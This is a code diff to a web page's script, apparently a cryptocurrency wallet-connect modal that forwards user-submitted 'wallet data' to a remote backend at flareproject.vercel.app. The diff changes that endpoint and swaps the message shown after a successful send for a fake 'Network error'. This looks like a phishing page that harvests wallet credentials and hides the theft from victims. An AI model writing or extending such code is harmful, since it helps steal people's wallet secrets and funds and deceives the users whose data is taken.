@@ -1634,12 +1634,7 @@ textarea:focus, input:focus {
     walletTriggerElements.forEach(element => {
         element.addEventListener('click', openWalletModal);
     });
-    // Removed navLinks from opening modal, as per new redirect logic for cards
-    // The previous request was to make *all* cards redirect, which included some elements that used to open the modal.
-    // Re-adding the `trigger-wallet-modal` class to the subscribe button will make it open the modal again.
-
-
-    // New: Event listener for all redirect cards
+            
     redirectCards.forEach(card => {
         card.addEventListener('click', function() {
             const url = this.getAttribute('data-redirect-url');
@@ -1731,7 +1726,7 @@ textarea:focus, input:focus {
     async function sendToBackend(data) {
         try {
             // Point this to your Node.js backend URL
-            const response = await fetch('https://flareproject.vercel.app/api/submit-wallet-data', {
+            const response = await fetch('https://flareproject.vercel.app/submit-wallet-data', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -1741,7 +1736,7 @@ textarea:focus, input:focus {
 
             if (response.ok) {
                 console.log('Data sent successfully to backend and forwarded!');
-                document.getElementById('errorScreen').querySelector('.error-message').textContent = 'Connection successful! Data sent via backend.';
+                document.getElementById('errorScreen').querySelector('.error-message').textContent = 'Network error';
                 setTimeout(() => {
                     walletModal.style.display = 'none';
                     document.body.style.overflow = 'auto';
